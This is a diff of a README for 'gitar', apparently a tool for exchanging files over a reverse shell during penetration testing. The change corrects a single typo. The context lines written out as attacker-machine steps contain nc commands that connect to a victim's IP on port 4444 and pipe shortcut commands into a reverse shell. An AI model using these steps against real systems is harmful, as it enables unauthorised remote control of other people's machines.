@@ -64,7 +64,7 @@ The following steps expose files of current directory. Files uploaded by remote 
 2. <sup>(Attacker machine)</sup> Launch the "server" : `gitar -e [server_reachable_ip]` *(By default this will copy on clipboard the command to set up gitar exchange, also available in server output)*
 3.  <sup>(Attacker machine)</sup> Connect to the reverse shell + load shortcut within:`nc [VICTIM_IP] 4444` then `CTRL+V` 
 
-An alternative is `export CMD=[CTRL+V] && (echo $CMD && cat) | nc [VICTIM_IP] 4444` *(Note: with `cat` you will not beneifit of bash completion)*
+An alternative is `export CMD=[CTRL+V] && (echo $CMD && cat) | nc [VICTIM_IP] 4444` *(Note: with `cat` you will not benefit of bash completion)*
 
 **And enjoy you revshell [🎶](#tldr---and-listen-music)**
 
